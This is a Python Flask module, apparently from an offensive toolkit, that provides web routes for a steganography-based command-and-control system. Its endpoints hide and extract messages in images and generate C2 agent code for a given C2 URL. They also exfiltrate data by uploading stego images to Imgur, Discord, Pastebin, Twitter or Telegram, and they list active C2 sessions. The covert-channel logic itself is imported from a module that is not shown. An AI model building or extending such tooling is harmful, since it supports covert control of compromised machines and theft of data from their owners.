"""
Steganography C2 - Flask Routes
Covert command & control via image steganography
"""

from flask import Blueprint, render_template, request, jsonify, send_file
from flask_login import login_required
import sys
import os
import base64
import io

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from stego_c2 import get_stego_c2, StegoMethod, ExfilPlatform
except ImportError:
    get_stego_c2 = None

stego_bp = Blueprint('stego_c2', __name__, url_prefix='/stego')


@stego_bp.route('/')
@login_required
def index():
    """Steganography C2 main page"""
    return render_template('stego_c2.html')


@stego_bp.route('/api/encode', methods=['POST'])
@login_required
def encode_message():
    """Encode message into image"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')  # Base64 encoded
    message = data.get('message')
    method = data.get('method', 'lsb_simple')
    encryption_key = data.get('key')
    
    if not image_data or not message:
        return jsonify({"error": "Image and message required"}), 400
    
    stego = get_stego_c2()
    
    try:
        method_enum = StegoMethod(method)
    except ValueError:
        method_enum = StegoMethod.LSB_SIMPLE
    
    # Decode base64 image
    image_bytes = base64.b64decode(image_data.split(',')[-1] if ',' in image_data else image_data)
    
    result = stego.encode_message(image_bytes, message, method_enum, encryption_key)
    
    if result.get('success'):
        # Return encoded image as base64
        encoded_b64 = base64.b64encode(result['encoded_image']).decode()
        return jsonify({
            "success": True,
            "encoded_image": f"data:image/png;base64,{encoded_b64}",
            "original_size": result.get('original_size'),
            "encoded_size": result.get('encoded_size'),
            "capacity_used": result.get('capacity_used')
        })
    else:
        return jsonify(result), 400


@stego_bp.route('/api/decode', methods=['POST'])
@login_required
def decode_message():
    """Decode message from image"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')  # Base64 encoded
    method = data.get('method', 'lsb_simple')
    encryption_key = data.get('key')
    
    if not image_data:
        return jsonify({"error": "Image required"}), 400
    
    stego = get_stego_c2()
    
    try:
        method_enum = StegoMethod(method)
    except ValueError:
        method_enum = StegoMethod.LSB_SIMPLE
    
    # Decode base64 image
    image_bytes = base64.b64decode(image_data.split(',')[-1] if ',' in image_data else image_data)
    
    result = stego.decode_message(image_bytes, method_enum, encryption_key)
    return jsonify(result)


@stego_bp.route('/api/capacity', methods=['POST'])
@login_required
def check_capacity():
    """Check image capacity for steganography"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')
    
    if not image_data:
        return jsonify({"error": "Image required"}), 400
    
    stego = get_stego_c2()
    
    # Decode base64 image
    image_bytes = base64.b64decode(image_data.split(',')[-1] if ',' in image_data else image_data)
    
    capacity = stego.calculate_capacity(image_bytes)
    return jsonify(capacity)


@stego_bp.route('/api/generate-agent', methods=['POST'])
@login_required
def generate_agent():
    """Generate stego C2 agent"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    c2_url = data.get('c2_url')
    platform = data.get('platform', 'imgur')
    encryption_key = data.get('key')
    language = data.get('language', 'python')
    
    if not c2_url:
        return jsonify({"error": "C2 URL required"}), 400
    
    stego = get_stego_c2()
    
    try:
        platform_enum = ExfilPlatform(platform)
    except ValueError:
        platform_enum = ExfilPlatform.IMGUR
    
    agent_code = stego.generate_agent_code(c2_url, platform_enum, encryption_key, language)
    return jsonify({"agent_code": agent_code, "language": language})


@stego_bp.route('/api/exfil', methods=['POST'])
@login_required
def exfiltrate():
    """Exfiltrate data via steganography"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    data = request.get_json()
    image_data = data.get('image')
    message = data.get('message')
    platform = data.get('platform', 'imgur')
    credentials = data.get('credentials', {})
    
    if not image_data or not message:
        return jsonify({"error": "Image and message required"}), 400
    
    stego = get_stego_c2()
    
    try:
        platform_enum = ExfilPlatform(platform)
    except ValueError:
        platform_enum = ExfilPlatform.IMGUR
    
    # Decode base64 image
    image_bytes = base64.b64decode(image_data.split(',')[-1] if ',' in image_data else image_data)
    
    result = stego.exfiltrate(image_bytes, message, platform_enum, credentials)
    return jsonify(result)


@stego_bp.route('/api/methods')
@login_required
def get_methods():
    """Get available steganography methods"""
    methods = [
        {"id": "lsb_simple", "name": "LSB Simple", "description": "Basic Least Significant Bit encoding"},
        {"id": "lsb_random", "name": "LSB Random", "description": "Random pixel selection LSB"},
        {"id": "lsb_encrypted", "name": "LSB Encrypted", "description": "Encrypted LSB with XOR"},
        {"id": "dct_jpeg", "name": "DCT JPEG", "description": "DCT coefficient modification"},
        {"id": "palette_png", "name": "Palette PNG", "description": "PNG palette manipulation"},
    ]
    return jsonify({"methods": methods})


@stego_bp.route('/api/platforms')
@login_required
def get_platforms():
    """Get available exfiltration platforms"""
    platforms = [
        {"id": "imgur", "name": "Imgur", "icon": "🖼️", "description": "Anonymous image hosting"},
        {"id": "discord", "name": "Discord", "icon": "💬", "description": "Discord CDN upload"},
        {"id": "pastebin", "name": "Pastebin", "icon": "📋", "description": "Base64 encoded paste"},
        {"id": "twitter", "name": "Twitter/X", "icon": "🐦", "description": "Image tweet"},
        {"id": "telegram", "name": "Telegram", "icon": "✈️", "description": "Telegram channel"},
    ]
    return jsonify({"platforms": platforms})


@stego_bp.route('/api/sessions')
@login_required
def get_sessions():
    """Get active C2 sessions"""
    if not get_stego_c2:
        return jsonify({"error": "Stego C2 module not available"}), 500
    
    stego = get_stego_c2()
    sessions = stego.get_active_sessions()
    return jsonify({"sessions": sessions})
